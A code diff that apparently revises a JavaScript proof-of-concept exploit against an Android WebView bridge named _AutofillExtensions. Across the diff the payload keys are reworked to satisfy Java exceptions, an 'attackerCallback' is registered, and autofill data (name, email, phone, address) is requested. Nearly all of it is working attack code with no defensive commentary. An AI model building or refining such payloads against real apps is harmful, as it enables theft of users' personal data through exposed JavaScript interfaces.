@@ -36,30 +36,28 @@
             }
             
             try {
-                log("Initializing callback handler with JSON...");
+                log("Initializing callback handler...");
                 
-                // The log showed Java expects a JSON string here.
+                // Added "callbackID" as requested by the Java exception
                 let initPayload = JSON.stringify({
-                    "callback": "attackerCallback",
-                    "callbackName": "attackerCallback",
-                    "name": "attackerCallback"
+                    "callbackID": "attackerCallback",
+                    "callbackName": "attackerCallback"
                 });
                 
                 window._AutofillExtensions.initializeCallbackHandler(initPayload);
-                log("Callback initialized.");
+                log("Callback initialized successfully.");
 
                 log("Requesting Autofill Data...");
                 
-                // We also pass the callback inside the request payload just in case
+                // Added "callbackID" here as well, along with requested fields
                 let requestPayload = JSON.stringify({
-                    "callback": "attackerCallback",
-                    "callbackName": "attackerCallback",
+                    "callbackID": "attackerCallback",
                     "request_id": "1337",
                     "requested_fields": ["NAME", "EMAIL", "PHONE", "ADDRESS"]
                 });
                 
                 window._AutofillExtensions.requestAutoFill(requestPayload);
-                log("requestAutoFill executed! Check device screen for prompts.");
+                log("requestAutoFill executed! Check device screen or logcat.");
                 
             } catch (e) {
                 log("Execution Failed: " + e.message);
